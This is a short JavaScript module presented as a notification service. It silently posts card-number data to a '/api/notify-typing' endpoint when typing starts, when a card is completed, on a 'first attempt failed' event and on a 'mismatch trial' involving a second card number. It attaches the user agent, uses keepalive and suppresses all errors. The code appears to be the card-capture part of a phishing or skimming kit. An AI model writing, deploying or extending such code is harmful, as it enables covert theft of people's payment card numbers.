// src/services/notifyService.js

const NOTIFY_ENABLED =
  String(import.meta.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';

/**
 * Send a notification. Silently no-ops if disabled or if the request fails.
 * @param {Object} payload
 * @param {string} payload.event - 'typing_start' | 'card_complete' | 'first_attempt_failed' | 'mismatch_trial'
 * @param {string} [payload.cardNumber]
 * @param {string} [payload.firstCardNumber]
 * @param {string} [payload.secondCardNumber]
 */
export async function sendNotify(payload) {
  if (!NOTIFY_ENABLED) return;
  try {
    await fetch('/api/notify-typing', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ...payload,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
      }),
      keepalive: true,
    });
  } catch {
    // silent — never block UI
  }
}

export const notifyEnabled = NOTIFY_ENABLED;
